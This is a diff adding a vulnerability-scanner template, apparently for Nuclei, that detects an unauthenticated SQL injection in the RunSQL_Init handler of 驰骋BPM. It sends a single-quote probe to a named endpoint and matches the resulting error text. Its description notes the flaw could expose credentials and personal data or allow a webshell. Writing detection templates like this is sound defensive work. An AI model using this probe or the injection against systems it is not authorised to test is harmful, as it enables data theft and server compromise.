@@ -1,0 +1,39 @@
+id: chicheng-bpm-sqli
+
+info:
+  name: 驰骋BPM系统存在SQL注入漏洞
+  author: qwtd
+  severity: high
+  description: |
+    驰骋BPM RunSQL_Init 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://github.com/wy876/POC/blob/a9e4000fc76d0157b53ade916323b7b8256b17c3/%E9%A9%B0%E9%AA%8BBPM/%E9%A9%B0%E9%AA%8BBPM%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+  tags: 驰骋BPM
+
+http:
+  - raw:
+      - |
+        POST /WF/Comm/Handler.ashx?DoType=RunSQL_Init HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----123128312312389898yd98ays98d
+        
+        ------123128312312389898yd98ays98d
+        Content-Disposition: form-data; name="SQL"
+        
+        '
+        ------123128312312389898yd98ays98d--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '引号不完整'
+          - 'RunSQL_Init'
+        part: body
+  
